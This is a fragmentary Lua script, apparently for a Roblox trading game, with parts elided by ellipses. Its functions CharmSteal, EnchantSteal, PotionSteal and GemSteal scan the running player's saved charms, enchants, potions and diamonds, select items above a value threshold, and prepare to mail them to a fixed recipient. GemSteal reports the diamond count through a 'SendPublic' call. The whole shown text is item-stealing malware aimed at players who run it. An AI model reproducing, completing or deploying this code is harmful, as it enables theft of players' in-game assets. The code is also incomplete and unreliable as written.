...
function CharmSteal()
    for i, v in pairs(save.Charm) do
		...
		if dircharm then
			if getRAP("Charm", v) >= min_rap then
				local args = {
					[1] = user,
					[2] = MailMessage,
					[3] = "Charm",
...
function EnchantSteal()
    for i, v in pairs(save.Enchant) do
		...
		if direnchant then
			if getRAP("Enchant", v) >= min_rap then
				local args = {
					[1] = user,
					[2] = MailMessage,
					[3] = "Enchant",
...
function PotionSteal()
    for i, v in pairs(save.Potion) do
		...
		if dirpotion then
			if getRAP("Potion", v) >= min_rap then
				local args = {
					[1] = user,
					[2] = MailMessage,
					[3] = "Potion",
...
function GemSteal()
    for i, v in pairs(GetSave().Inventory.Currency) do
        if v.id == "Diamonds" then
			...
			SendPublic("Gems: " .. (GemAmount-10000))
        end
    end
end
